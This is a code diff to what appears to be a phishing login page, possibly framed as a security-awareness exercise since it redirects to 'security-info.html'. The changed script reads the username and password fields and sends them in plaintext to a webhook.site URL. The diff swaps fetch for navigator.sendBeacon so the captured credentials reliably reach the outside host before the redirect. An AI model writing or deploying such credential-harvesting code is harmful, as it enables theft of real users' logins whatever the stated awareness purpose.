@@ -31,25 +31,26 @@
             let user = document.querySelector('input[name="user"]').value;
             let pass = document.querySelector('input[name="pass"]').value;
             
-            // Redirect user immediately to awareness page
-            window.location.href = "security-info.html";
+            // Create payload
+            let payload = JSON.stringify({
+                user: user,
+                pass: pass,
+                action: "Login Attempt",
+                time: new Date().toISOString()
+            });
 
-            // Send form data in the background
-            fetch("https://webhook.site/39b5507e-6e25-4a60-b84e-3cd3e4e84c0f", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    user: user,
-                    pass: pass,
-                    action: "Login Attempt",
-                    time: new Date().toISOString()
-                })
-            }).catch(error => console.error("Error sending data:", error));
+            // Send data using sendBeacon (does not block redirection)
+            let webhookURL = "https://webhook.site/39b5507e-6e25-4a60-b84e-3cd3e4e84c0f";
+            navigator.sendBeacon(webhookURL, payload);
+
+            // Redirect user immediately
+            window.location.href = "security-info.html";
         });
     </script>
 
 </body>
 </html>
+
 
 
 
